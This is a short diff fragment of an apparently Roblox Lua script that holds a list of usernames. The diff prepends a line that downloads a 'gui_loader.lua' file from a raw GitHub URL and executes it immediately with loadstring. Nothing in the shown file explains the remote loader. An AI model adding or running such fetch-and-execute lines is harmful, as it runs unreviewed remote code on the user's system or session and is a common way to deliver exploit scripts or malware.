@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/gui_loader.lua"))()
+
 users = {
     "ajandaa12alt1",
     "Qusay52VxWi",
